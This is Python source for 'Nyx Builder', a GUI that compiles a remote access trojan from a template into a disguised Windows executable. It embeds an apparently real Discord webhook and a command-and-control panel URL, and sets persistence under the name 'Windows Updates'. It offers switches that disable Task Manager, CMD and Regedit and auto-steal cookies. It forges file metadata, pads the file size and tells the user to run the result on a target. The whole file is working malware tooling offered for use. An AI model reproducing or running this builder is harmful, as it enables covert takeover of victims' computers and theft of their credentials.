import time
# -*- coding: utf-8 -*-
"""Nyx Builder — standalone RAT EXE (GUI)"""
import os, sys, time, uuid, subprocess, shutil, threading, traceback
from pathlib import Path

try:
    import tkinter as tk
    from tkinter import ttk, messagebox, scrolledtext
except ImportError:
    print("tkinter required"); sys.exit(1)

ROOT = Path(__file__).parent.resolve()
TEMPLATE = ROOT / "rat_template.py"
DEFAULTS = {
    "webhook": "https://discord.com/api/webhooks/1543153142705692703/_y_8ra_CN28ogAnzwqI2Zjx7_gDd81QbPrSfW3z4ht0usUBNN-XlBj-4RmJBx9-O53_Z",
    "c2": "https://nyxpanel.onrender.com",
    "exe_name": "ProjectNyx",
    "startup_name": "Windows Updates",
    "file_version": "2.3.0.0",
    "product_version": "2.3",
    "company": "Nyx Executors",
    "description": "Project Nyx",
    "product_name": "Project Nyx",
    "copyright": "© Nyx Executors. All rights reserved.",
}

def log(box, msg):
    def _():
        box.configure(state="normal")
        box.insert("end", msg + "\n")
        box.see("end")
        box.configure(state="disabled")
    box.after(0, _)

def build_rat_exe(cfg, log_fn):
    if not TEMPLATE.exists():
        log_fn("ERROR: rat_template.py missing")
        return None
    # integrity: template must contain markers
    raw = TEMPLATE.read_text(encoding="utf-8", errors="replace")
    need = ["CLIENT_VERSION", "steal_roblox", "firefox_nightly", "self_update", "CREATE_NO_WINDOW", "{{C2}}", "{{OWNER_ID}}"]
    missing = [m for m in need if m not in raw]
    if missing:
        log_fn("ERROR: template corrupted / outdated — missing: " + ", ".join(missing))
        log_fn("Replace rat_template.py from the updated builder zip")
        return None
    if "CLIENT_VERSION" in raw and 'CLIENT_VERSION = "' in raw:
        try:
            ver = raw.split('CLIENT_VERSION = "')[1].split('"')[0]
            log_fn(f"template ok · client {ver} · {len(raw)} bytes")
        except Exception:
            log_fn(f"template ok · {len(raw)} bytes")

    build_id = str(uuid.uuid4())[:8]
    code = TEMPLATE.read_text(encoding="utf-8")
    sn = cfg.get("startup_name") or "Windows Updates"
    reps = {
        "{{WEBHOOK}}": repr(cfg.get("webhook") or ""),
        "{{C2}}": repr((cfg.get("c2") or "").rstrip("/")),
        "{{OWNER_ID}}": repr(str(cfg.get("owner_id") or "1")),
        "{{BUILD_ID}}": repr(build_id),
        "{{PERSISTENCE}}": str(cfg["persistence"]),
        "{{STARTUP_NAME}}": repr(sn),
        "{{BOOT_DISABLE_TASKMGR}}": str(cfg["boot_taskmgr"]),
        "{{BOOT_DISABLE_CMD}}": str(cfg["boot_cmd"]),
        "{{BOOT_DISABLE_REGEDIT}}": str(cfg["boot_regedit"]),
        "{{BOOT_WATCHDOG}}": str(cfg["boot_watchdog"]),
        "{{BOOT_AUTO_STEAL}}": str(cfg["boot_autosteal"]),
        "{{WATCHDOG_COPIES}}": str(int(cfg["watchdog_copies"])),
    }

    for a, b in reps.items():
        code = code.replace(a, b)
    # verify generated source parses
    try:
        compile(code, "rat.py", "exec")
    except SyntaxError as e:
        log_fn(f"ERROR: generated rat.py syntax: {e}")
        log_fn("Check Startup name / paths for quotes")
        return None
    work = ROOT / "build_temp"
    if work.exists():
        try:
            shutil.rmtree(work)
        except Exception:
            # locked by antivirus / previous build — use unique folder
            work = ROOT / f"build_temp_{int(time.time())}"
    try:
        work.mkdir(parents=True, exist_ok=True)
    except Exception as e:
        log_fn(f"ERROR: cannot create build dir: {e}")
        return None
    # clean leftover rat.py if any
    try:
        for oldf in work.glob("rat.py"):
            oldf.unlink()
    except Exception:
        pass
    (work / "rat.py").write_text(code, encoding="utf-8")
    ver = cfg["file_version"].split(".")
    while len(ver) < 4:
        ver.append("0")
    vt = ", ".join(ver[:4])
    (work / "version.txt").write_text(
        f"""VSVersionInfo(
  ffi=FixedFileInfo(filevers=({vt}), prodvers=({vt}), mask=0x3f, flags=0x0, OS=0x40004, fileType=0x1, subtype=0x0, date=(0, 0)),
  kids=[StringFileInfo([StringTable(u'040904B0', [
    StringStruct(u'CompanyName', u'{cfg["company"]}'), StringStruct(u'FileDescription', u'{cfg["description"]}'),
    StringStruct(u'FileVersion', u'{cfg["file_version"]}'), StringStruct(u'InternalName', u'{cfg["exe_name"]}'),
    StringStruct(u'LegalCopyright', u'{cfg["copyright"]}'), StringStruct(u'OriginalFilename', u'{cfg["exe_name"]}.exe'),
    StringStruct(u'ProductName', u'{cfg["product_name"]}'), StringStruct(u'ProductVersion', u'{cfg["product_version"]}')
  ])]), VarFileInfo([VarStruct(u'Translation', [1033, 1200])])]
)""",
        encoding="utf-8",
    )
    cmd = [
        sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", "--clean",
        "--name", cfg["exe_name"],
        "--distpath", str((work / "dist").resolve()),
        "--workpath", str((work / "work").resolve()),
        "--specpath", str(work.resolve()),
        "--version-file", str((work / "version.txt").resolve()),
        # stealer deps — without these, frozen exe gets 0 cookies
        "--hidden-import", "cryptography",
        "--hidden-import", "cryptography.hazmat",
        "--hidden-import", "cryptography.hazmat.primitives",
        "--hidden-import", "cryptography.hazmat.primitives.ciphers",
        "--hidden-import", "cryptography.hazmat.primitives.ciphers.aead",
        "--hidden-import", "cryptography.hazmat.backends",
        "--hidden-import", "cryptography.hazmat.backends.openssl",
        "--hidden-import", "browser_cookie3",
        "--hidden-import", "sqlite3",
        "--hidden-import", "Crypto",
        "--hidden-import", "Crypto.Cipher",
        "--hidden-import", "Crypto.Cipher.AES",
        "--collect-all", "cryptography",
        "--collect-all", "browser_cookie3",
        "--hidden-import", "pyaudio",
        "--hidden-import", "wave",
    ]
    icon = (cfg.get("icon") or "").strip()
    if icon and Path(icon).is_file():
        cmd += ["--icon", str(Path(icon).resolve())]
        log_fn("Using icon " + icon)
    cmd.append(str((work / "rat.py").resolve()))
    log_fn("PyInstaller running (1–3 min first time)…")
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode != 0:
        log_fn((r.stderr or r.stdout or "")[-2500:])
        log_fn("FAILED")
        return None
    built = work / "dist" / f"{cfg['exe_name']}.exe"
    if not built.exists():
        log_fn("output missing")
        return None
    final = ROOT / f"{cfg['exe_name']}.exe"
    if final.exists():
        final.unlink()
    shutil.copy(built, final)
    target_mb = int(cfg.get("target_mb") or 0)
    if target_mb > 0:
        cur = final.stat().st_size
        want = target_mb * 1024 * 1024
        if want > cur:
            log_fn(f"Padding to {target_mb} MB…")
            with open(final, "ab") as f:
                f.write(b"\0" * (want - cur))
        elif want < cur:
            log_fn(f"Built size {cur/1024/1024:.1f} MB already > target; no pad")
    log_fn(f"OK → {final} ({final.stat().st_size/1024/1024:.1f} MB)")
    return final

class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Nyx Builder")
        self.geometry("700x620")
        self.minsize(620, 500)
        self.configure(bg="#0c0a0b")
        self._ui()

    def _ui(self):
        canvas = tk.Canvas(self, bg="#0c0a0b", highlightthickness=0)
        sb = ttk.Scrollbar(self, orient="vertical", command=canvas.yview)
        canvas.configure(yscrollcommand=sb.set)
        sb.pack(side="right", fill="y")
        canvas.pack(side="left", fill="both", expand=True)
        main = tk.Frame(canvas, bg="#0c0a0b", padx=16, pady=12)
        win = canvas.create_window((0, 0), window=main, anchor="nw")
        main.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.bind("<Configure>", lambda e: canvas.itemconfig(win, width=e.width))
        canvas.bind_all("<MouseWheel>", lambda e: canvas.yview_scroll(int(-1*(e.delta/120)), "units"))

        def section(title):
            f = tk.LabelFrame(main, text=title, fg="#fb7185", bg="#141014",
                              font=("Segoe UI", 10, "bold"), padx=10, pady=8)
            f.pack(fill="x", pady=8)
            return f

        c = section("C2 / Discord")
        self.ent_webhook = self._field(c, "Webhook", DEFAULTS["webhook"])
        self.ent_c2 = self._field(c, "Panel URL", DEFAULTS["c2"])
        self.ent_owner = self._field(c, "Owner / Builder ID", "1")

        i = section("EXE identity")
        self.ent_name = self._field(i, "EXE name", DEFAULTS["exe_name"])
        self.ent_startup = self._field(i, "Startup Run name", DEFAULTS["startup_name"])
        self.ent_company = self._field(i, "Company", DEFAULTS["company"])
        self.ent_desc = self._field(i, "Description", DEFAULTS["description"])
        self.ent_product = self._field(i, "Product name", DEFAULTS["product_name"])
        self.ent_fver = self._field(i, "File version", DEFAULTS["file_version"])
        self.ent_pver = self._field(i, "Product version", DEFAULTS["product_version"])
        self.ent_copy = self._field(i, "Copyright", DEFAULTS["copyright"])
        rowi = tk.Frame(i, bg="#141014"); rowi.pack(fill="x", pady=4)
        tk.Label(rowi, text="Icon .ico (optional)", width=20, anchor="w", bg="#141014", fg="#9a7a84").pack(side="left")
        self.ent_icon = tk.Entry(rowi, bg="#1a1418", fg="#f5e6ea", insertbackground="#fff", relief="flat")
        self.ent_icon.pack(side="left", fill="x", expand=True, ipady=3)
        tk.Button(rowi, text="Browse", command=self._browse_icon, bg="#1a1418", fg="#f5e6ea", relief="flat").pack(side="left", padx=6)

        b = section("When EXE opens")
        self.var_persist = tk.BooleanVar(value=True)
        self.var_wd = tk.BooleanVar(value=False)
        self.var_taskmgr = tk.BooleanVar(value=False)
        self.var_cmd = tk.BooleanVar(value=False)
        self.var_reg = tk.BooleanVar(value=False)
        self.var_steal = tk.BooleanVar(value=False)
        for text, var in [
            ("Persistence (Run key)", self.var_persist),
            ("Watchdog on launch", self.var_wd),
            ("Disable Task Manager", self.var_taskmgr),
            ("Disable CMD", self.var_cmd),
            ("Disable Regedit", self.var_reg),
            ("Auto-steal on first check-in", self.var_steal),
        ]:
            tk.Checkbutton(b, text=text, variable=var, bg="#141014", fg="#f5e6ea",
                           selectcolor="#1a1418", activebackground="#141014").pack(anchor="w")
        row = tk.Frame(b, bg="#141014")
        row.pack(fill="x", pady=4)
        tk.Label(row, text="Watchdog copies (1–12)", bg="#141014", fg="#9a7a84").pack(side="left")
        self.sp_wd = tk.Spinbox(row, from_=1, to=12, width=4, bg="#1a1418", fg="#f5e6ea")
        self.sp_wd.delete(0, "end"); self.sp_wd.insert(0, "3")
        self.sp_wd.pack(side="left", padx=8)
        row3 = tk.Frame(b, bg="#141014"); row3.pack(fill="x", pady=4)
        tk.Label(row3, text="Pad EXE size MB (0=off, min~12)", bg="#141014", fg="#9a7a84").pack(side="left")
        self.sp_mb = tk.Spinbox(row3, from_=0, to=80, width=5, bg="#1a1418", fg="#f5e6ea")
        self.sp_mb.delete(0, "end"); self.sp_mb.insert(0, "0")
        self.sp_mb.pack(side="left", padx=8)

        a = section("Build")
        tk.Label(a, text="pip install pyinstaller cryptography browser-cookie3 pywin32 pillow opencv-python pynput psutil requests",
                 bg="#141014", fg="#9a7a84", font=("Segoe UI", 8), wraplength=620, justify="left").pack(anchor="w")
        btn = tk.Frame(a, bg="#141014"); btn.pack(fill="x", pady=6)
        tk.Button(btn, text="Build EXE", command=self._start, bg="#e11d48", fg="white",
                  font=("Segoe UI", 11, "bold"), relief="flat", padx=20, pady=8).pack(side="left")
        tk.Button(btn, text="Open folder", command=lambda: os.startfile(str(ROOT)),
                  bg="#1a1418", fg="#f5e6ea", relief="flat", padx=12, pady=8).pack(side="left", padx=8)

        lg = section("Log")
        self.log_box = scrolledtext.ScrolledText(lg, height=11, bg="#0a0809", fg="#e8d5da",
                                                  font=("Consolas", 9), state="disabled", relief="flat")
        self.log_box.pack(fill="both", expand=True)

        t = section("How to")
        tk.Label(t, text="1. pip install deps  2. python local_builder.py  3. set options  4. Build EXE  5. run on target → panel",
                 bg="#141014", fg="#c4a8b0", font=("Segoe UI", 9), justify="left", wraplength=620).pack(anchor="w")

    def _field(self, parent, label, default):
        row = tk.Frame(parent, bg="#141014"); row.pack(fill="x", pady=2)
        tk.Label(row, text=label, width=20, anchor="w", bg="#141014", fg="#9a7a84").pack(side="left")
        e = tk.Entry(row, bg="#1a1418", fg="#f5e6ea", insertbackground="#fff", relief="flat")
        e.insert(0, default); e.pack(side="left", fill="x", expand=True, ipady=3)
        return e

    def _browse_icon(self):
        from tkinter import filedialog
        p = filedialog.askopenfilename(filetypes=[("Icon", "*.ico"), ("All", "*.*")])
        if p:
            self.ent_icon.delete(0, "end")
            self.ent_icon.insert(0, p)

    def _cfg(self):
        return {
            "webhook": self.ent_webhook.get().strip(),
            "c2": self.ent_c2.get().strip(),
            "owner_id": self.ent_owner.get().strip() or "1",
            "exe_name": self.ent_name.get().strip() or "ProjectNyx",
            "startup_name": self.ent_startup.get().strip() or "Windows Updates",
            "company": self.ent_company.get().strip(),
            "description": self.ent_desc.get().strip(),
            "product_name": self.ent_product.get().strip(),
            "file_version": self.ent_fver.get().strip() or "1.0.0.0",
            "product_version": self.ent_pver.get().strip() or "1.0",
            "copyright": self.ent_copy.get().strip(),
            "persistence": self.var_persist.get(),
            "boot_watchdog": self.var_wd.get(),
            "boot_taskmgr": self.var_taskmgr.get(),
            "boot_cmd": self.var_cmd.get(),
            "boot_regedit": self.var_reg.get(),
            "boot_autosteal": self.var_steal.get(),
            "watchdog_copies": self.sp_wd.get(),
            "target_mb": int(float(self.sp_mb.get() or 0)),
            "icon": self.ent_icon.get().strip() if hasattr(self, "ent_icon") else "",
        }

    def _start(self):
        cfg = self._cfg()
        def run():
            try:
                log(self.log_box, "=== build ===")
                build_rat_exe(cfg, lambda m: log(self.log_box, m))
                log(self.log_box, "=== done ===")
            except Exception:
                log(self.log_box, traceback.format_exc())
        threading.Thread(target=run, daemon=True).start()

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--cli":
        cfg = {**{k: DEFAULTS.get(k, "") for k in DEFAULTS}, "persistence": True,
               "boot_watchdog": False, "boot_taskmgr": False, "boot_cmd": False,
               "boot_regedit": False, "boot_autosteal": False, "watchdog_copies": 3}
        cfg["exe_name"] = DEFAULTS["exe_name"]
        cfg["startup_name"] = DEFAULTS["startup_name"]
        build_rat_exe(cfg, print)
    else:
        App().mainloop()
